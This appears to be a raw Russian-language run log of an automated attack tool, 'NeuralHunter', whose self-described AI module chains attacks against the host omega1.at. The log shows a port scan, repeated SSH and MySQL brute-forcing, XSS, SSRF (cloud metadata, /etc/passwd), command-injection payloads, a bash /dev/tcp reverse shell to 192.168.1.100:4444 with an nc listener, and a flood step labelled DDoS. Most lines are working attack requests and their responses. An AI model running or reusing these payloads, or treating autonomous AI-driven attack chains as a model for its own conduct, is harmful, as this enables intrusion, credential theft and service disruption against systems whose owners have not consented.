2025-11-04 16:03:33,078 - NeuralHunter - INFO - [bold magenta]НЕЙРОННЫЙ ЛОГЕР v10.1 АКТИВИРОВАН[/bold magenta]
2025-11-04 16:03:33,080 - NeuralHunter - INFO - [bold magenta]НЕЙРОННЫЙ ХАНТЕР v10.2 АКТИВИРОВАН[/bold magenta]
2025-11-04 16:03:33,568 - NeuralHunter - INFO - [bold cyan]ИИ: ИИ АКТИВИРОВАН: NeuralBrain v10.2[/bold cyan]
2025-11-04 16:03:33,570 - NeuralHunter - INFO - ЦЕПОЧКА: HUNTER → http://omega1.at/FUZZ
2025-11-04 16:03:33,571 - NeuralHunter - INFO - ULTIMATE TOKEN HUNTER → http://omega1.at/FUZZ
2025-11-04 16:03:33,972 - NeuralHunter - INFO - [GET] http://omega1.at/ → 200
2025-11-04 16:03:33,975 - NeuralHunter - INFO - ЦЕПОЧКА: PORT_SCAN → http://omega1.at/FUZZ
2025-11-04 16:03:33,976 - NeuralHunter - INFO - PORT SCAN → http://omega1.at/FUZZ
2025-11-04 16:03:33,986 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 21
2025-11-04 16:03:33,990 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 22
2025-11-04 16:03:33,994 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 80
2025-11-04 16:03:33,998 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 443
2025-11-04 16:03:34,002 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 8080
2025-11-04 16:03:34,005 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 8443
2025-11-04 16:03:34,008 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 3306
2025-11-04 16:03:34,012 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 5432
2025-11-04 16:03:34,018 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: MYSQL_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 16:03:34,020 - NeuralHunter - INFO - MYSQL BRUTEFORCE → omega1.at:3306
2025-11-04 16:03:47,037 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: SSH_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 16:03:47,039 - NeuralHunter - INFO - SSH BRUTEFORCE → omega1.at:22
2025-11-04 16:04:17,321 - NeuralHunter - INFO - ЦЕПОЧКА: SQL → http://omega1.at/FUZZ
2025-11-04 16:04:17,323 - NeuralHunter - INFO - SQL INJECTION → http://omega1.at/FUZZ
2025-11-04 16:04:18,653 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=1 → 200
2025-11-04 16:04:18,655 - NeuralHunter - INFO - ОТВЕТ: 200 (437 bytes)
2025-11-04 16:04:18,657 - NeuralHunter - ERROR - JSON ошибка: Expecting value: line 1 column 3 (char 2)
2025-11-04 16:04:18,658 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: MYSQL_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 16:04:18,660 - NeuralHunter - INFO - MYSQL BRUTEFORCE → omega1.at:3306
2025-11-04 16:04:32,689 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: SSH_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 16:04:32,691 - NeuralHunter - INFO - SSH BRUTEFORCE → omega1.at:22
2025-11-04 16:05:02,926 - NeuralHunter - INFO - ЦЕПОЧКА: XSS → http://omega1.at/FUZZ
2025-11-04 16:05:02,927 - NeuralHunter - INFO - XSS АТАКА → http://omega1.at/FUZZ
2025-11-04 16:05:02,928 - NeuralHunter - INFO - XSS ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=%3Cscript%3Ealert%281%29%3C/script%3E
2025-11-04 16:05:03,429 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%3Cscript%3Ealert%281%29%3C/script%3E → 403
2025-11-04 16:05:03,432 - NeuralHunter - INFO - XSS ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
2025-11-04 16:05:03,729 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E → 200
2025-11-04 16:05:03,731 - NeuralHunter - INFO - XSS ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=javascript%3Aalert%281%29
2025-11-04 16:05:04,013 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=javascript%3Aalert%281%29 → 200
2025-11-04 16:05:04,015 - NeuralHunter - INFO - XSS ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=%3Csvg/onload%3Dalert%281%29%3E
2025-11-04 16:05:04,307 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%3Csvg/onload%3Dalert%281%29%3E → 200
2025-11-04 16:05:04,309 - NeuralHunter - INFO - XSS ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=%22%27%3E%3Cscript%3Ealert%281%29%3C/script%3E
2025-11-04 16:05:04,824 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%22%27%3E%3Cscript%3Ealert%281%29%3C/script%3E → 403
2025-11-04 16:05:04,827 - NeuralHunter - INFO - XSS ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=%3Ciframe%20src%3Djavascript%3Aalert%281%29%3E
2025-11-04 16:05:05,362 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%3Ciframe%20src%3Djavascript%3Aalert%281%29%3E → 403
2025-11-04 16:05:05,365 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: MYSQL_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 16:05:05,366 - NeuralHunter - INFO - MYSQL BRUTEFORCE → omega1.at:3306
2025-11-04 16:05:18,405 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: SSH_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 16:05:18,406 - NeuralHunter - INFO - SSH BRUTEFORCE → omega1.at:22
2025-11-04 16:05:48,688 - NeuralHunter - INFO - ЦЕПОЧКА: CSRF → http://omega1.at/FUZZ
2025-11-04 16:05:48,690 - NeuralHunter - INFO - CSRF АТАКА → http://omega1.at/FUZZ
2025-11-04 16:05:48,975 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ → 200
2025-11-04 16:05:48,977 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: MYSQL_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 16:05:48,978 - NeuralHunter - INFO - MYSQL BRUTEFORCE → omega1.at:3306
2025-11-04 16:06:02,020 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: SSH_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 16:06:02,022 - NeuralHunter - INFO - SSH BRUTEFORCE → omega1.at:22
2025-11-04 16:06:32,377 - NeuralHunter - INFO - ЦЕПОЧКА: SSRF → http://omega1.at/FUZZ
2025-11-04 16:06:32,378 - NeuralHunter - INFO - SSRF АТАКА → http://omega1.at/FUZZ
2025-11-04 16:06:32,380 - NeuralHunter - INFO - SSRF ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=http%3A//169.254.169.254/latest/meta-data/
2025-11-04 16:06:32,674 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=http%3A//169.254.169.254/latest/meta-data/ → 200
2025-11-04 16:06:32,675 - NeuralHunter - INFO - SSRF ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=http%3A//127.0.0.1%3A22
2025-11-04 16:06:32,990 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=http%3A//127.0.0.1%3A22 → 200
2025-11-04 16:06:32,992 - NeuralHunter - INFO - SSRF ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=file%3A///etc/passwd
2025-11-04 16:06:33,473 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=file%3A///etc/passwd → 403
2025-11-04 16:06:33,475 - NeuralHunter - WARNING - SSRF ЗАБЛОКИРОВАН: 403 на file:///etc/passwd
2025-11-04 16:06:33,477 - NeuralHunter - INFO - SSRF ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=file%3A///proc/version
2025-11-04 16:06:33,797 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=file%3A///proc/version → 200
2025-11-04 16:06:33,799 - NeuralHunter - INFO - SSRF ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=gopher%3A//127.0.0.1%3A3306/_%252e%252e
2025-11-04 16:06:34,093 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=gopher%3A//127.0.0.1%3A3306/_%252e%252e → 200
2025-11-04 16:06:34,095 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: MYSQL_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 16:06:34,097 - NeuralHunter - INFO - MYSQL BRUTEFORCE → omega1.at:3306
2025-11-04 16:06:47,126 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: SSH_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 16:06:47,128 - NeuralHunter - INFO - SSH BRUTEFORCE → omega1.at:22
2025-11-04 16:07:17,475 - NeuralHunter - INFO - ЦЕПОЧКА: RCE → http://omega1.at/FUZZ
2025-11-04 16:07:17,476 - NeuralHunter - INFO - RCE АТАКА → http://omega1.at/FUZZ
2025-11-04 16:07:17,478 - NeuralHunter - INFO - RCE ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=%3Bid
2025-11-04 16:07:17,751 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%3Bid → 200
2025-11-04 16:07:17,753 - NeuralHunter - INFO - RCE ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=%7Cwhoami
2025-11-04 16:07:18,035 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%7Cwhoami → 200
2025-11-04 16:07:18,037 - NeuralHunter - INFO - RCE ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=%24%28id%29
2025-11-04 16:07:18,497 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%24%28id%29 → 403
2025-11-04 16:07:18,500 - NeuralHunter - INFO - RCE НАЙДЕН: $(id)
2025-11-04 16:07:18,505 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: MYSQL_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 16:07:18,507 - NeuralHunter - INFO - MYSQL BRUTEFORCE → omega1.at:3306
2025-11-04 16:07:31,523 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: SSH_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 16:07:31,524 - NeuralHunter - INFO - SSH BRUTEFORCE → omega1.at:22
2025-11-04 16:08:01,707 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: REVERSE_SHELL → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 16:08:01,709 - NeuralHunter - INFO - REVERSE SHELL → http://omega1.at/FUZZ?FUZZ=%3Bbash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/192.168.1.100/4444%200%3E%261%27
2025-11-04 16:08:01,710 - NeuralHunter - INFO - СЛУШАЙ: nc -lvnp 4444
2025-11-04 16:08:03,260 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%3Bbash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/192.168.1.100/4444%200%3E%261%27 → 403
2025-11-04 16:08:03,264 - NeuralHunter - INFO - ЦЕПОЧКА: DDOS → http://omega1.at/FUZZ
2025-11-04 16:08:03,266 - NeuralHunter - WARNING - SMART DDOS: 200 запросов → http://omega1.at/FUZZ (ТОЛЬКО НА СВОЙ СЕРВЕР!)
2025-11-04 16:09:11,142 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: MYSQL_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 16:09:11,144 - NeuralHunter - INFO - MYSQL BRUTEFORCE → omega1.at:3306
2025-11-04 16:09:24,188 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: SSH_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 16:09:24,190 - NeuralHunter - INFO - SSH BRUTEFORCE → omega1.at:22
2025-11-04 16:09:54,335 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: REVERSE_SHELL → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 16:09:54,337 - NeuralHunter - INFO - REVERSE SHELL → http://omega1.at/FUZZ?FUZZ=%3Bbash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/192.168.1.100/4444%200%3E%261%27
2025-11-04 16:09:54,338 - NeuralHunter - INFO - СЛУШАЙ: nc -lvnp 4444
2025-11-04 16:09:54,830 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%3Bbash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/192.168.1.100/4444%200%3E%261%27 → 403
2025-11-04 16:09:54,835 - NeuralHunter - CRITICAL - [bold red]БРЕШЬ: БРЕШЬ: PORT_SCAN НАЙДЕНА![/bold red]
2025-11-04 16:09:54,836 - NeuralHunter - CRITICAL - [bold red]БРЕШЬ: БРЕШЬ: RCE НАЙДЕНА![/bold red]
2025-11-04 16:09:54,838 - NeuralHunter - CRITICAL - [bold red]БРЕШЬ: БРЕШЬ: REVERSE_SHELL НАЙДЕНА![/bold red]
2025-11-04 16:09:54,839 - NeuralHunter - CRITICAL - [bold red]БРЕШЬ: БРЕШЬ: DDOS НАЙДЕНА![/bold red]
2025-11-04 16:09:54,840 - NeuralHunter - CRITICAL - [bold red]БРЕШЬ: БРЕШЬ: REVERSE_SHELL НАЙДЕНА![/bold red]
2025-11-04 16:09:54,844 - NeuralHunter - INFO - [bold cyan]ИИ: ИИ ЭВОЛЮЦИОНИРОВАЛ: ai_brain.json[/bold cyan]
2025-11-04 16:09:54,847 - NeuralHunter - INFO - [bold green]УСПЕХ: ОТЧЁТ ГОТОВ: JSON + MD + HTML[/bold green]
